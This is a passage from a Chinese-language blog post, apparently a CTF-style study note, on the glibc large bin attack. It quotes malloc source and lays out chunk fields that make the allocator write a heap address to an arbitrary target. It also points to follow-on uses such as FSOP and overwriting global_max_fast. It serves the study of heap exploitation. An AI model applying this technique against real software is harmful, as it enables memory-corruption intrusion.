fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。</p>
+<p>比如，现在存在一个已经在large bin 当中的chunk1：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = largebin(index); <span class="comment">// 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置</span></span><br><span class="line">    bk = largebin(index);</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个即将放入large bin当中的chunk2：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到将上面的翻译下来其实就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = largebin(index);</span><br><span class="line">chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;<span class="comment">// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;<span class="comment">// 前面的那个不需要管</span></span><br></pre></td></tr></table></figure>
+
+<p>这样也就同样实现了任意地址写上堆地址。</p>
+<p>任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。</p>
+<hr>
+<p>参考链接：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244018" >https://www.anquanke.com/post/id/244018<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/02/24/tcache-stashing-unlink-attack/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">tcache stashing unlink attack</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/02/23/FSOP/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FSOP</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-}
 
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
 
 
                 
